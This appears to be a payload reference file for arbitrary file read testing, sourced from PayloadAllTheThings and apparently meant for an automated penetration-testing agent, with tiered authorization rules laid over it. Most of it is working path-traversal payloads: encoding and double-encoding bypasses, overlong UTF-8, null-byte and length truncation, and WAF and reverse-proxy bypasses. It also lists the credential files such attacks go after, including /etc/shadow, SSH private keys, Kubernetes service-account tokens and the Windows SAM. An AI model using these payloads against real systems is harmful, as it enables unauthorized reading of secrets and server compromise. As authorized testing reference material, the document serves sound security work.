# Arbitrary File Read Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadAllTheThings

## Manual Testing

**Note: Maximum 8 probes**

---

## Validation Tier Classification

This payload file uses a **tiered validation approach**:

| Tier | Description | Authorization |
|------|-------------|---------------|
| **Tier 1: Safe Validation** | Path traversal to test files (`/etc/passwd`, `win.ini`), encoding bypass | No authorization needed |
| **Tier 2: Authorized Extended** | Non-sensitive source code read, internal file read | User explicit authorization required |
| **Tier 3: Theory Reference** | Config/credential file reading | For understanding only, do not execute |

**Default execution**: Only Tier 1 methods.
**Stop condition**: After confirming file read exists (test file content returned).

---

## Validation Objectives (Within Security Boundary)

Arbitrary file read vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Path Traversal | ✓ Read test file (`/etc/passwd`, `win.ini`) | - | Read credentials/private keys |
| Source Code Read | ❌ Not by default | ✓ Read non-sensitive source | Read config with secrets |
| Encoding Bypass | ✓ Test encoding variations | - | Read sensitive files via bypass |
| Internal File Read | ❌ Not by default | ✓ Requires explicit authorization | Read internal config/secrets |

**Safe Validation Method**: Read only test files to prove vulnerability; do not read credentials, keys, or sensitive configs.
```bash
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
..\/..\/..\/etc/passwd
```

## Encoding Bypass

### URL Encoding
```bash
%2e%2e%2f                      # ../
%2e%2e/                        # ../
..%2f                          # ../
%2e%2e%5c                      # ..\
%5c..%5c                       # \..\ 
```

### Double URL Encoding
```bash
%252e%252e%252f                # ../
%252e%252e%252f%252e%252e%252f  # ../../
%255c%255c                     # \\
```

### Unicode Encoding
```bash
%u002e%u002e%u2215             # ../
%uff0e%uff0e%u2215             # ../
%c0%ae%c0%ae%c0%af            # ../  (Overlong UTF-8)
%c0%ae%c0%ae/                  # ../
%e0%80%ae%e0%80%ae/            # ../
```

### UTF-8 Overlong Encoding
```bash
%c0%2e                         # .
%c0%ae                         # .
%c0%af                         # /
%c0%5c                         # \
%c0%80%5c                      # \
```

## Path Truncation
```bash
# Path length over 4096 bytes truncated (PHP)
../../../etc/passwd............[repeat to 4096 chars]
../../../etc/passwd/./././.[repeat to 4096 chars]
../../../[repeat many]../../../../etc/passwd
```

## Null Byte Truncation (PHP < 5.3.4)
```bash
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
.%00./.%00./etc/passwd
```

## WAF Bypass

### When ../ Filtered
```bash
....//....//....//etc/passwd     # After ../ filtered becomes ../../
..././..././..././etc/passwd     # After ../ filtered becomes ../../
..///////..////..////etc/passwd  # Extra slashes
```

### Nginx Reverse Proxy Bypass
```bash
..;/etc/passwd                   # Nginx treats as directory, Tomcat treats as ../
..;/..;/..;/etc/passwd
```

### UNC Path (Windows)
```bash
\\localhost\c$\windows\win.ini
\\127.0.0.1\c$\windows\win.ini
```

### Java URL Protocol
```bash
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

### ASP.NET Cookieless Bypass
```bash
/(S(X))/admin/secret.aspx
/admin/(S(X))/secret.aspx
/admin/Foobar/(S(X))/../(S(X))/main.aspx
```

## Linux Sensitive Files

### System Information
```bash
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/issue
/etc/motd
/proc/version
/proc/cmdline
```

### Network Configuration
```bash
/etc/resolv.conf
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/etc/network/interfaces
```

### Web Application Config
```bash
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/conf.d/default.conf
/var/www/html/.htaccess
/var/www/html/web.config
/usr/local/etc/php/php.ini
```

### Credentials and Keys
```bash
/etc/mysql/my.cnf
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/*/.ssh/id_rsa
/home/*/.bash_history
/root/.bash_history
/root/.mysql_history
/etc/ssh/sshd_config
```

### Application Source
```bash
/proc/self/cwd/index.php
/proc/self/cwd/main.py
/proc/self/cwd/app.js
/proc/self/environ
```

### Kubernetes
```bash
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
```

## Windows Sensitive Files

### Test Files
```bash
C:\Windows\win.ini
C:\Windows\System32\license.rtf
C:\Windows\win.ini
```

### System Files
```bash
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\repair\SAM
C:\Windows\repair\System
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\global.asa
```

### Application Config
```bash
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\Users\Administrator\.ssh\id_rsa
```

### Others
```bash
C:\sysprep.inf
C:\sysprep.xml
C:\unattend.xml
C:\unattend.txt
C:\system32\inetsrv\metabase.xml
C:\inetpub\logs\LogFiles\
```

## Analysis Process

1. Parameter identification (file, path, src, url, document, folder, etc.)
2. Basic payload test (../../../etc/passwd)
3. Response analysis (file content returned/error)
4. Filter rule analysis
5. Encoding bypass
6. Confirm existence

## Output

- Proof payload
- Complete request packet
- Read file content

## Severity Classification

Arbitrary file-read severity is based on **whether arbitrary file-read capability is confirmed**. Reading a harmless, universally present file such as `/etc/passwd` can prove capability without collecting sensitive secrets.

| Actual case | Severity | Note |
|---------|------|------|
| Reads sensitive file (keys/configuration/source code) | High | Sensitive data leak |
| Reads `/etc/passwd` or an equivalent harmless proof file | High | Capability confirmed; do not downgrade solely because the proof file is not secret |
| Reads file but content is harmless | Low | Read succeeds but no sensitive data |
| file-read interface exists but cannot read | Low | Pending confirmation/defense effective |

**Key judgment**: Reporting High requires confirming **arbitrary file-read capability** (reading passwd establishes it). Harmless reads or failed reads are Low. Use harmless files during testing to prove capability; sensitive file reads are Tier 2.

---

## Prohibited

- ⚠️ No reading/downloading sensitive credential files
- ⚠️ Only prove existence + provide command/PoC
